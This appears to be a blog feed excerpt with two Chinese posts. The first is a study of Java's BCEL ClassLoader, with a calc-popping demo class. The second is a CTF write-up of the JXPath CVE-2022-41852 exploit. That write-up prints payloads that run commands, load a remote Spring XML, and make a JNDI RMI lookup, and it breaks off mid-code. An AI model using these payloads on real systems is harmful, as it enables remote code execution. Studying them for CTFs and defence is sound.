    <id>https://ke1nys.github.io/posts/30ead299.html</id>
    <published>2023-04-25T12:46:38.000Z</published>
    <updated>2023-04-26T13:05:32.227Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">参考文章</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>BCEL平常在测试反序列化的时候也经常会用到，比如延时测Gadget以及在某些场景下执行命令不是那么顺手的情况下选择BCEL去打内存马，就像Fastjson和Thymeleaf SSTI这种。以前也只是用到这个BCEL但是没有仔细学习过，下面简单学习记录下BCEL。</p><h1 id="Java安全之BCEL-ClassLoader"><a href="#Java安全之BCEL-ClassLoader" class="headerlink" title="Java安全之BCEL ClassLoader"></a>Java安全之BCEL ClassLoader</h1><p>目录</p><ul><li>Java安全之BCEL ClassLoader<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#写在前面">写在前面</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">About BCEL</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#调试分析">调试分析</a></li><li>食用姿势<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fuzz反序列化gadget">Fuzz反序列化Gadget</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fastjson-bcel-payload">Fastjson BCEL Payload</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#thymeleaf-ssti-payload">Thymeleaf SSTI Payload</a></li></ul></li></ul></li></ul><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面#"></a>写在前面<a href="https://www.cnblogs.com/CoLo/p/15869871.html#写在前面">#</a></h2><p>BCEL平常在测试反序列化的时候也经常会用到，比如延时测Gadget以及在某些场景下执行命令不是那么顺手的情况下选择BCEL去打内存马，就像Fastjson和Thymeleaf SSTI这种。以前也只是用到这个BCEL但是没有仔细学习过，下面简单学习记录下BCEL。</p><h2 id="About-BCEL"><a href="#About-BCEL" class="headerlink" title="About BCEL"></a>About BCEL</h2><p>BCEL Classloader在 JDK &lt; 8u251之前是在rt.jar里面。<br>同时在Tomcat中也会存在相关的依赖<br>tomcat7</p><p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>tomcat8及其以后</p><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>而在<code>rt.jar!/com/sun/org/apache/bcel/internal/util/</code>包下，有<code>Classloader</code>这么一个类，可以实现加载字节码并初始化一个类的功能，该类也是个Classloader（继承了原生的Classloader类）重写了<code>loadClass()</code>方法，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先会判断类名是否以$$$BCEL$$$开头，之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>先来看下简单的使用，在同一包下，准备一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>准备一个BCEL的demo,运行即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">         <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">         <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">         System.out.println(code);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425210508013.png" alt="image-20230425210508013"></p><p>这样就成功弹其计算器了</p><p>进入loadClass(),首先会判断类名是否以$$$BCEL$$$开头，之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><p><strong>这里原因就是刚开始对loadClass的分析</strong></p><p>那么我们就进行断点调试跟一下</p><p><img src="../images/image-20230425211759344.png" alt="image-20230425211759344"></p><p>这里由于我们前面给文件头加了个BCEl字节码，于是这里就可以进入createClass()</p><p><strong>createClass源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">  <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    clazz = parser.parse();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">  <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">  <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Class);</span><br><span class="line">  <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                   Constants.CONSTANT_Utf8);</span><br><span class="line">  name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>createClass()</code>中,通过<code>subString()</code>截取$$$BCEL$$$后的字符串，并调用<code>Utility.decode</code>进行相应的解码并最终返回改字节码的bytes数组(decode方法参数uncompress用来标识是否为zip流，当为true时走zip流解码)。之后生成<code>Parser</code>解析器并调用<code>parse()</code>方法进行解析，并生成<code>JavaClass</code>对象<br>createClass源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">    <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">    <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Class);</span><br><span class="line">    <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Utf8);</span><br><span class="line">    name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425212337403.png" alt="image-20230425212337403"></p><p>这里就是前面为什么要进行字节码编码的原因，因为这里会进行解码</p><p><strong>Utility.decode()源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Decode a string back to a byte array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes the byte array to convert</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uncompress use gzip to uncompress the stream of bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode(String s, <span class="type">boolean</span> uncompress) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line"></span><br><span class="line">  <span class="type">CharArrayReader</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharArrayReader</span>(chars);</span><br><span class="line">  <span class="type">JavaReader</span>      <span class="variable">jr</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaReader</span>(car);</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ch;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = jr.read()) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    bos.write(ch);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bos.close();</span><br><span class="line">  car.close();</span><br><span class="line">  jr.close();</span><br><span class="line"></span><br><span class="line">  <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(uncompress) &#123;</span><br><span class="line">    <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] tmp   = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length * <span class="number">3</span>]; <span class="comment">// Rough estimate</span></span><br><span class="line">    <span class="type">int</span>    <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>    b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((b = gis.read()) &gt;= <span class="number">0</span>)</span><br><span class="line">      tmp[count++] = (<span class="type">byte</span>)b;</span><br><span class="line"></span><br><span class="line">    bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[count];</span><br><span class="line">    System.arraycopy(tmp, <span class="number">0</span>, bytes, <span class="number">0</span>, count);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后获取到了该<code>JavaClass</code>对象的bytes数组并调用java原生的<code>defineClass()</code>加载</p><p><img src="../images/image-20230425213242406.png" alt="image-20230425213242406"></p><p>之后就是在<code>newInstance()</code>时初始化触发静态代码块执行</p><p>之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><p><strong>这里就是为什么要用javaclass和utility编码的原因</strong></p><p><strong>上面的参考文章里还有一些题目是利用BCEl的，可以去参考参考一下</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="BCEL Java ClassLoader" scheme="https://ke1nys.github.io/tags/BCEL-Java-ClassLoader/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF-WEB-复现</title>
    <link href="https://ke1nys.github.io/posts/8a205ef3.html"/>
    <id>https://ke1nys.github.io/posts/8a205ef3.html</id>
    <published>2023-04-24T12:25:09.000Z</published>
    <updated>2023-04-26T13:05:32.225Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezjxpath"><a href="#ezjxpath" class="headerlink" title="ezjxpath"></a><strong>ezjxpath</strong></h2><p><strong>cve-2022-41852</strong></p><p>这里看别的师傅的博客写的是<strong>TCTF中的非预期解</strong></p><p>刚开始的时候,发现这是个CVE漏洞，但是google能搜到的方法他全给ban了，所以这个得自己去找利用链子来打</p><p><img src="../images/image-20230424202815660.png" alt="image-20230424202815660"></p><p>这里的话是给了一个不知道啥玩意的东西，然后把jar包下载下来进行查看</p><p><img src="../images/image-20230424203035639.png" alt="image-20230424203035639"></p><p>就是这里产生了漏洞利用点</p><p><strong>网上能查到的payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;exec(java.lang.Runtime.getRuntime(), &#x27;calc&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext.new(\&quot;http://127.0.0.1:9000/spring-Evil.xml\&quot;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;javax.naming.InitialContext.doLookup(&#x27;rmi://127.0.0.1:1099/1u560y&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是这常见的三种，但是都给ban掉了</p><p><img src="../images/image-20230424203330834.png" alt="image-20230424203330834"></p><p>于是我们就得自己去寻找链子来打了</p><p>如此一来我们只能另寻蹊跷了，赛后就突然想到TCTF里的非预期解好多都是静态方法，而这里我们也是用静态方法去利用的<br><code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code>，这个类的<code>_main</code>方法逻辑如下</p><p>这个类在<code>rt.jar</code>包里，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">/* Expects class name as first argument, other arguments are by-passed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Missing class name.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">class_name</span> <span class="operator">=</span> argv[<span class="number">0</span>];</span><br><span class="line">    String[] new_argv = <span class="keyword">new</span> <span class="title class_">String</span>[argv.length - <span class="number">1</span>];</span><br><span class="line">    System.arraycopy(argv, <span class="number">1</span>, new_argv, <span class="number">0</span>, new_argv.length);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWrapper</span>();</span><br><span class="line">    wrapper.runMain(class_name, new_argv);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要逻辑在于runMain方法里面，class_name和new_argv就是类名和参数，逻辑如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runMain</span><span class="params">(String class_name, String[] argv)</span> <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span>   <span class="variable">cl</span>    <span class="operator">=</span> loader.loadClass(class_name);</span><br><span class="line">  <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method = cl.getMethod(<span class="string">&quot;_main&quot;</span>,  <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; argv.getClass() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method _main is sane ?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>   <span class="variable">m</span> <span class="operator">=</span> method.getModifiers();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> method.getReturnType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(Modifier.isPublic(m) &amp;&amp; Modifier.isStatic(m)) ||</span><br><span class="line">       Modifier.isAbstract(m) || (r != Void.TYPE))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(NoSuchMethodException no) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;In class &quot;</span> + class_name +</span><br><span class="line">                       <span class="string">&quot;: public static void 